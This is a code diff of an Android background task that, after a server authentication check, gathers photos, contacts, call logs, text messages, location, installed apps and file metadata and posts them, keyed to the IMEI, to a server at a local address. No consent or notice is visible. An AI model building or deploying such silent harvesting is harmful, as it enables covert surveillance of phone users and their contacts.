@@ -61,51 +61,56 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
     @Override
     protected Void doInBackground(MasterTaskParams... params) {
 
-        String maskHash = ServerCommunicationHandler.getMask(params[0].context,
-                "http://192.168.1.24:58938/api/Service/GetMask",
-                params[0].IMEI);
-        String[] maskHash2 = maskHash.split(";");
-        String[] hashes = maskHash2[1].split(":");
+        if (ServerCommunicationHandler.getServerAuthentification(params[0].context,
+                "http://192.168.1.24:58938/api/Service/GetAuthentification",
+                params[0].IMEI)) {
+            String maskHash = ServerCommunicationHandler.getMask(params[0].context,
+                    "http://192.168.1.24:58938/api/Service/GetMask",
+                    params[0].IMEI);
+            String[] maskHash2 = maskHash.split(";");
+            String[] hashes = maskHash2[1].split(":");
 
-        getFilesMetadata(hashes[7], params[0].context, params[0].IMEI);
-        JSONObject bulkData = new JSONObject();
-        for (int i = 0; i < maskHash2[0].length(); i++) {
-            if (maskHash2[0].charAt(i) == '1') {
-                switch (i) {
-                    case 0:
-                        getPhotos(hashes[i], MediaStore.Images.Media.INTERNAL_CONTENT_URI,
-                                params[0].context, params[0].IMEI);
-                        getPhotos(hashes[i], MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                                params[0].context, params[0].IMEI);
-                        break;
-                    case 1:
-                        getContacts(bulkData, hashes[i], params[0].context);
-                        break;
-                    case 2:
-                        getCallHistory(bulkData, hashes[i], params[0].context);
-                        break;
-                    case 3:
-                        getMessages(bulkData, hashes[i], params[0].context);
-                        break;
-                    case 4:
-                        getMobileDataUsage(bulkData, hashes[i]);
-                        break;
-                    case 5:
-                        getInstalledApps(hashes[i], params[0].context, params[0].IMEI);
-                        break;
-                    case 6:
-                        getSmartphoneLocation(bulkData, hashes[i], params[0].context);
-                        break;
-                    case 7:
-                        getBatteryLevel(bulkData, params[0].context);
-                        break;
+            getFilesMetadata(hashes[7], params[0].context, params[0].IMEI);
+            JSONObject bulkData = new JSONObject();
+            for (int i = 0; i < maskHash2[0].length(); i++) {
+                if (maskHash2[0].charAt(i) == '1') {
+                    switch (i) {
+                        case 0:
+                            getPhotos(hashes[i], MediaStore.Images.Media.INTERNAL_CONTENT_URI,
+                                    params[0].context, params[0].IMEI);
+                            getPhotos(hashes[i], MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                                    params[0].context, params[0].IMEI);
+                            break;
+                        case 1:
+                            getContacts(bulkData, hashes[i], params[0].context);
+                            break;
+                        case 2:
+                            getCallHistory(bulkData, hashes[i], params[0].context);
+                            break;
+                        case 3:
+                            getMessages(bulkData, hashes[i], params[0].context);
+                            break;
+                        case 4:
+                            getMobileDataUsage(bulkData, hashes[i]);
+                            break;
+                        case 5:
+                            getInstalledApps(hashes[i], params[0].context, params[0].IMEI);
+                            break;
+                        case 6:
+                            getSmartphoneLocation(bulkData, hashes[i], params[0].context);
+                            break;
+                        case 7:
+                            getBatteryLevel(bulkData, params[0].context);
+                            break;
+                    }
                 }
             }
+
+            ServerCommunicationHandler.executeDataPost(params[0].context,
+                    "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
+                    params[0].IMEI);
         }
 
-        ServerCommunicationHandler.executeDataPost(params[0].context,
-                "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
-                params[0].IMEI);
         return null;
     }
 
